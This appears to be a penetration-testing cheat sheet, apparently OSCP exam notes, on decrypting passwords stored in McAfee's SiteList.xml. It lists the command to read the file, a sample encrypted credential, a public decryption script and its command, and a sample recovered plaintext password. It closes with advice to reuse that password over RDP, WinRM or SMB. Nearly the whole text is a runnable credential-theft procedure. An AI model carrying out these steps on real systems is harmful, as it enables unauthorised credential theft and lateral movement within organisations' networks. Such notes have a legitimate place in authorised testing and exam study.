# Mcafee Password Decryption
```bash

# Step 1: Check if McAfee is installed and find SiteList.xml
# Common location:
type "C:\Users\All Users\McAfee\Common Framework\SiteList.xml"
# Example Result:
# <UserName>OSCP-ADMIN</UserName>
# <Password Encrypted="1">kjfLpAhMgviammlLnboAULK23gr5bdK3Z2OkDTrFXsR/abAFPM9B22djpA06xV7Ef2mwBTzPQdtnY6QNOsVexA==</Password>
# What to do next? Copy the base64 encrypted password and decrypt it below.
```

# Step 2: Download the decryption script on Kali
```bash
# https://github.com/funoverip/mcafee-sitelist-pwd-decryption

#Downloaded in tools folder
cd /home/kali/tools/mcafee-sitelist-pwd-decryption-master/
```
# Step 3: Decrypt the password
```bash
python3 mcafee_sitelist_pwd_decrypt.py <base64 encrypted password>

# Example:
python3 mcafee_sitelist_pwd_decrypt.py kjfLpAhMgviammlLnboAULK23gr5bdK3Z2OkDTrFXsR/abAFPM9B22djpA06xV7Ef2mwBTzPQdtnY6QNOsVexA==
# Example Result:
# Crypted password  : kjfLpAhMgviammlLnboAULK23gr5bdK3Z2OkDTrFXsR/abAFPM9B22djpA06xV7Ef2mwBTzPQdtnY6QNOsVexA==
# Decrypted password: CheeseCrackerGrapes902
# What to do next? Use the plaintext password to authenticate via RDP, WinRM, SMB etc.
```